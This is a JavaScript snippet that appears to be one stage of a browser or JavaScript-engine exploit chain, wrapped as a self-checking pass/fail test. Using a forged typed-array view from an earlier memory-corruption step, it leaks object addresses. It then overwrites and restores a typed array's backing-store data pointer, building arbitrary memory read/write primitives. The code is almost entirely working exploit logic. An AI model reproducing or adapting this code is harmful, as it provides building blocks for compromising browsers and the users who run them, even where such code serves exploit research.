// Create two owned 64 KiB typed arrays and validate a reversible data-pointer
// swap using this page's live-calibrated forged-view base.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.calibratedViewBase ||
      state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_typed_views_preflight_failed");
  var forged = state.view;
  var a = new Uint8Array(65536);
  var b = new Uint8Array(65536);
  a.fill(0x44);
  b.fill(0x42);
  a[0] = 0x31;
  a[7] = 0xa8;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 ||
      b[0] !== 0x42 || b[7] !== 0x42)
    throw new Error("owned_canary_mismatch");
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var n = 0; n < 8; n++) bytes.push(forged[state.index + n]);
    } finally {
      state.array[0] = state.a;
    }
    var out = "0x";
    for (var n = 7; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function bytesAt(at) {
    var bytes = [];
    for (var n = 0; n < 8; n++) bytes.push(forged[at + n]);
    return bytes;
  }
  function hex(bytes) {
    var out = "0x";
    for (var n = 7; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  var base = state.calibratedViewBase;
  var anchorIndex = Number(wordOf(state.addressAnchor)) + 8 - base;
  if (!Number.isSafeInteger(base) || base % 4096 !== 0 ||
      anchorIndex < 0 || anchorIndex + 3 >= 2097152 ||
      !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_gate_failed");
  var anchorLive = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    anchorLive = matches(anchorIndex, 0x55667788);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!anchorLive || !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_not_live");
  phase = "pointer_gate";
  var aWord = wordOf(a);
  var bWord = wordOf(b);
  var aIndex = Number(aWord) - base;
  var bIndex = Number(bWord) - base;
  if (!Number.isSafeInteger(aIndex) || !Number.isSafeInteger(bIndex) ||
      aIndex < 0 || bIndex < 0 ||
      aIndex + 15 >= 16777216 || bIndex + 15 >= 16777216)
    throw new Error("typed_cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  var replacement = bytesAt(bIndex + 8);
  var aData = Number(hex(original));
  var bData = Number(hex(replacement));
  if (!Number.isSafeInteger(aData) || !Number.isSafeInteger(bData) ||
      aData <= 0 || bData <= 0 ||
      Math.abs(bData - aData) < 65536)
    throw new Error("data_pointer_spacing_mismatch");
  if (api && typeof api.markSync === "function")
    api.markSync("typed_pointer_before_swap");
  phase = "swap";
  var aliasChanged = false;
  var otherUnchanged = false;
  var aliasRestored = false;
  viewChanged = true;
  try {
    for (var w = 0; w < 8; w++) forged[slot + w] = replacement[w];
    aliasChanged = a[0] === 0x42 && a[7] === 0x42 &&
      hex(bytesAt(slot)) === hex(replacement);
    otherUnchanged = b[0] === 0x42 && b[7] === 0x42;
  } finally {
    for (var r = 0; r < 8; r++) forged[slot + r] = original[r];
    viewChanged = false;
    aliasRestored = a[0] === 0x31 && a[7] === 0xa8 &&
      hex(bytesAt(slot)) === hex(original) && state.array[0] === state.a;
  }
  if (api && typeof api.markSync === "function")
    api.markSync("typed_pointer_restored");
  if (aliasChanged && otherUnchanged && aliasRestored) {
    state.ownedTypedView = a;
    state.otherTypedView = b;
  }
  result = { id: "typed_pair_setup_v1",
    status: aliasChanged && otherUnchanged && aliasRestored ? "pass" : "fail",
    details: { base: "0x" + base.toString(16),
      a_word: aWord, b_word: bWord, slot_index: slot,
      a_data: hex(original), b_data: hex(replacement),
      alias_changed: aliasChanged, other_unchanged: otherUnchanged,
      alias_restored: aliasRestored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var x = 0; x < 8; x++) state.view[slot + x] = original[x];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "typed_pair_setup_v1", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
